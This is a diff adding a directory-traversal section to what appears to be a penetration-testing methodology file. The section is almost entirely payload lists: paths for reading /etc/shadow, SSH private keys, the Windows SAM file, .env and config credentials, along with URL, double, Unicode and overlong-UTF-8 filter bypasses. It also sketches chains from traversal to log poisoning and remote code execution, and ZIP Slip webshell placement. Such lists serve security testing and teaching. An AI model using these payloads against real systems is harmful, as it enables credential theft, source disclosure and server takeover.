@@ -1198,7 +1198,234 @@ file, filename, path, filepath, page, doc, download, include, template, view, ur
   ```json
   { "file": "../../etc/passwd" }
   ```
+# **✅ Directory Traversal Attack – Complete Test Case (with Bypass Cases)**
 
+1 Basic Path Traversal (“../” sequences)
+
+2 Encoded Path Traversal (URL, Unicode, UTF-8)
+
+3 Double-Encoded Traversal
+
+4 Null Byte Injection (Legacy PHP/Java)
+
+5 Absolute Path Injection
+
+6 Filter Bypass using Nested Traversal
+
+7 Path Normalization Vulnerability
+
+8 Directory Traversal via File Upload
+
+9 Traversal inside ZIP, TAR extraction
+
+10 Traversal in API parameters (/download?file=)
+
+11 Log File / Sensitive File Exposure
+
+12 OS Command File Read Chaining
+
+13 Traversal via Path Overwrite (%2e%2e/)
+
+14 Mixed Encoding Traversal
+
+15 SSRF → Traversal on server-side FS
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Clean structure — normal payload list)*
+
+```
+2.1 Basic Traversal
+../../../../etc/passwd
+```
+
+```
+2.2 Windows Traversal
+..\..\..\windows\win.ini
+```
+
+```
+2.3 Absolute Path Injection
+/etc/shadow
+```
+
+```
+2.4 Traversal Using Null Byte
+../../etc/passwd%00.jpg
+```
+
+```
+2.5 API Traversal Attempt
+/download?file=../../../../etc/hosts
+```
+
+```
+2.6 Traversal via Image Parameter
+?path=../../uploads/
+```
+
+```
+2.7 Within ZIP/TAR Extraction
+../../../../var/www/html/shell.php
+```
+
+```
+2.8 Directory Enumeration
+../../../../
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Payloads for Learning)**
+
+*(Actual offensive payloads widely used in real-world exploitation)*
+
+```
+3.1 Unix Sensitive File Read
+../../../../../../etc/shadow
+```
+
+```
+3.2 SSH Key Extraction
+../../../../../home/user/.ssh/id_rsa
+```
+
+```
+3.3 Apache Log Poisoning → RCE Chain
+../../../../var/log/apache2/access.log
+```
+
+```
+3.4 PHP Session Stealing
+../../../../var/lib/php/sessions/sess_12345
+```
+
+```
+3.5 Configuration File Leak
+../../../../etc/mysql/my.cnf
+```
+
+```
+3.6 Read Application Secrets
+../../../../app/config/config.json
+```
+
+```
+3.7 Windows SAM File Read
+..\..\..\Windows\System32\config\SAM
+```
+
+```
+3.8 Tomcat Credentials Read
+../../../../conf/tomcat-users.xml
+```
+
+```
+3.9 NGINX Passwords
+../../../../etc/nginx/.htpasswd
+```
+
+```
+3.10 Source Code Read
+../../../../var/www/html/index.php
+```
+
+---
+
+# **4. Bypass Techniques (Filter, Encoding, WAF, Normalization)**
+
+*(Bypass payload list only)*
+
+```
+4.1 URL Encoded Traversal
+..%2f..%2f..%2fetc%2fpasswd
+```
+
+```
+4.2 Double URL Encoding
+..%252f..%252fetc%252fpasswd
+```
+
+```
+4.3 Mixed Encoding Technique
+..%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+```
+4.4 Unicode Bypass
+..%c0%af..%c0%af..%c0%afetc/passwd
+```
+
+```
+4.5 Hex Encoded Bypass
+..%2e%2e%5cetc%5cpasswd
+```
+
+```
+4.6 Overlong UTF-8 Bypass
+..%c0%ae%c0%ae/
+```
+
+```
+4.7 Path Injection Using Dot Trick
+....//....//etc/passwd
+```
+
+```
+4.8 Backslash Injection for Windows
+..\\..\\..\\boot.ini
+```
+
+```
+4.9 Filtering Bypass with Fake Folder Prefix
+..%2f..%2fsub/../etc/passwd
+```
+
+```
+4.10 Trailing Slash Normalization Bypass
+../../../../etc/passwd/
+```
+
+---
+
+# **5. Advanced Attack Chains (Real-World Exploitation)**
+
+```
+5.1 Directory Traversal → Log Poisoning → RCE
+../../../../var/log/nginx/access.log
+```
+
+```
+5.2 Directory Traversal → Read DB Credentials → DB Takeover
+../../../../../var/www/app/.env
+```
+
+```
+5.3 Directory Traversal → Config Read → Admin Password Leak
+../../../../../config/admin.php
+```
+
+```
+5.4 ZIP Slip (Unzip Traversal) → Webshell Deployment
+../../../../var/www/html/shell.php
+```
+
+```
+5.5 Path Traversal → LFI → RCE Chain
+../../../../var/www/html/index.php?page=../../../../etc/passwd
+```
+
+```
+5.6 Web Cache → Traversal → Credential Theft
+../../../../../etc/apache2/.htpasswd
+```
+
+```
+5.7 Traversal → Private SSH Key Leak → Full Server Access
+../../../../home/appuser/.ssh/id_rsa
+```
 # HTTP Parameter Pollution
 
 ## Methodology
